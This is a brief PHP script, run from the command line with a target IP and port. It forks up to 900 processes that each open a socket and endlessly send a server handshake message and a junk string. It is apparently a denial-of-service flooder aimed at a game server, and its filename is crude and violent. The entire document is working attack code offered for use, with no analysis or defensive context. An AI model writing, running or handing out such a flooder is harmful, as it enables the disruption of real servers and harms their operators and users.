php Rape.php IP Port
<?php
$ip = $argv[1];
$port = $argv[2];
for($x = 0; $x < 900; $x++){
$id = pcntl_fork();
if($id != 0)
break;
}
$f = fsockopen($ip,$port);
while(true){
fwrite($f,"<msg t='sys'><body action='rndK' r='-1'></body></msg>" . chr(0));
fwrite($f,"REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP.REMOVEOpenCP" . chr(0));
}
?>